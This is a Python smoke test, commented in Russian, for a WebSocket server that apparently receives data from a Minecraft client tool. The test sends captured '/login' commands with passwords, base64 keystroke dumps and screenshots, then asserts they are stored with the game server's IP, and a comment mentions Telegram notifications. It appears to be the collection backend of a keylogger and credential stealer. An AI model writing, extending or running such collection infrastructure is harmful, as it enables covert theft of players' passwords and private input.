# Разовый протокольный тест WS-сервера на 8770: hello/status/command/keydump/screenshot.
# Telegram не биндим (_bot None) — уведомления уйдут в логи, не в чаты.
import asyncio
import base64
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import database
import websocket_server

DB = os.path.join(tempfile.gettempdir(), "mc_protocol_smoke.db")
for suffix in ("", "-wal", "-shm"):
    try:
        os.remove(DB + suffix)
    except FileNotFoundError:
        pass
database.init(DB)
TOKEN, ROW_ID = database.add_token("smoke-test")


async def main() -> None:
    server = await websocket_server.start("127.0.0.1", 8770)
    import websockets
    async with websockets.connect("ws://127.0.0.1:8770") as ws:
        await ws.send(json.dumps({
            "type": "hello", "token": TOKEN,
            "installation_id": "smoke-install", "nickname": "SmokeTest", "protocol": 1,
        }))
        reply = json.loads(await ws.recv())
        assert reply["type"] == "welcome", reply
        print("[ok] welcome получен")

        await ws.send(json.dumps({
            "type": "status", "nickname": "SmokeTest",
            "server": "fake-server (:)", "ip": "1.2.3.4",
        }))
        await ws.send(json.dumps({
            "type": "command", "command": "/login", "raw": "/login 555666",
            "ip": "1.2.3.4", "server": "fake-server", "nickname": "SmokeTest",
        }))
        await ws.send(json.dumps({
            "type": "keydump",
            "data_b64": base64.b64encode("[2026-11-06] [MC] SmokeTest @ fake: login123".encode()).decode(),
        }))
        await ws.send(json.dumps({
            "type": "screenshot",
            "data_b64": base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"\x00" * 64).decode(),
        }))
        await ws.send(json.dumps({"type": "keepalive"}))
        await asyncio.sleep(1.2)

        row = database.get_by_token_hash(database.hash_token(TOKEN))
        assert row and row["connected"] == 1, row
        assert row["server_ip"] == "1.2.3.4", row
        cmds = database.list_recorded_commands(5)
        assert (cmds and cmds[0]["command"].startswith("/login")
                and cmds[0]["server_ip"] == "1.2.3.4"), cmds
        print("[ok] command закаркан в commands_log с ip:", cmds[0]["server_ip"])
        print("[ok] клиент в базе: ник=%r сервер=%r ip=%r" % (row["nickname"], row["server"], row["server_ip"]))
    await websocket_server.stop(server)


asyncio.run(main())
database.delete_client(database.hash_token(TOKEN))
print("[ok] одноразовый токен удалён — чистая база для входа игры")
